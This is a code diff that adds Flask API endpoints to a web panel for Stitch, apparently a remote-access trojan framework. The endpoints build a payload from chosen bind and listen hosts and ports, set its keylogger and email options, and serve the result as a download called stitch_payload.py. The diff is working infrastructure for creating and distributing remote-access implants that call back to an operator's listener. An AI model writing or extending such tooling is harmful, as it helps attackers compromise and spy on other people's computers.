@@ -779,6 +779,119 @@ def export_commands():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+@app.route('/api/generate-payload', methods=['POST'])
+@login_required
+@limiter.limit("5 per hour")  # Limit payload generation
+def generate_payload():
+    """Generate Stitch payload with specified configuration"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        data = request.json or {}
+        
+        # Get configuration from request
+        bind_host = data.get('bind_host', '')
+        bind_port = data.get('bind_port', '4433')
+        listen_host = data.get('listen_host', 'localhost') 
+        listen_port = data.get('listen_port', '4455')
+        enable_bind = data.get('enable_bind', True)
+        enable_listen = data.get('enable_listen', True)
+        
+        # Validate inputs
+        try:
+            bind_port = int(bind_port)
+            listen_port = int(listen_port)
+            if not (1 <= bind_port <= 65535) or not (1 <= listen_port <= 65535):
+                raise ValueError("Invalid port range")
+        except ValueError:
+            return jsonify({'error': 'Invalid port numbers'}), 400
+        
+        # Import payload generation
+        from Application.stitch_gen import run_exe_gen
+        from Application.stitch_pyld_config import stitch_ini
+        import tempfile
+        import shutil
+        
+        # Create temporary config
+        config_backup = None
+        try:
+            # Backup existing config if it exists
+            from Application.Stitch_Vars.globals import st_config
+            if os.path.exists(st_config):
+                config_backup = st_config + '.backup'
+                shutil.copy2(st_config, config_backup)
+            
+            # Create new config with web parameters
+            stini = stitch_ini()
+            stini.set_value('BIND', str(enable_bind))
+            stini.set_value('BHOST', bind_host)
+            stini.set_value('BPORT', str(bind_port))
+            stini.set_value('LISTEN', str(enable_listen))
+            stini.set_value('LHOST', listen_host)
+            stini.set_value('LPORT', str(listen_port))
+            stini.set_value('EMAIL', 'None')
+            stini.set_value('EMAIL_PWD', '')
+            stini.set_value('KEYLOGGER_BOOT', 'False')
+            
+            # Generate payload
+            run_exe_gen(auto_confirm=True, create_installers=False)
+            
+            # Find generated payload
+            payload_path = None
+            if os.path.exists('Configuration/st_main.py'):
+                payload_path = 'Configuration/st_main.py'
+                
+                # Read the payload content
+                with open(payload_path, 'r') as f:
+                    payload_content = f.read()
+                
+                log_debug(f"Payload generated successfully: {len(payload_content)} bytes", "INFO", "Payload")
+                
+                return jsonify({
+                    'success': True,
+                    'message': 'Payload generated successfully',
+                    'payload_size': len(payload_content),
+                    'config': {
+                        'bind_host': bind_host,
+                        'bind_port': bind_port,
+                        'listen_host': listen_host,
+                        'listen_port': listen_port,
+                        'enable_bind': enable_bind,
+                        'enable_listen': enable_listen
+                    },
+                    'download_url': '/api/download-payload'
+                })
+            else:
+                return jsonify({'error': 'Payload generation failed - no output file'}), 500
+                
+        finally:
+            # Restore backup config
+            if config_backup and os.path.exists(config_backup):
+                shutil.move(config_backup, st_config)
+        
+    except Exception as e:
+        log_debug(f"Payload generation error: {str(e)}", "ERROR", "Payload")
+        return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500
+
+@app.route('/api/download-payload')
+@login_required
+def download_payload():
+    """Download the generated payload"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        payload_path = 'Configuration/st_main.py'
+        
+        if os.path.exists(payload_path):
+            log_debug("Payload downloaded", "INFO", "Payload")
+            return send_file(payload_path, 
+                           as_attachment=True, 
+                           download_name='stitch_payload.py',
+                           mimetype='text/x-python')
+        else:
+            return jsonify({'error': 'No payload available for download'}), 404
+            
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/api/upload', methods=['POST'])
 @login_required
 @limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
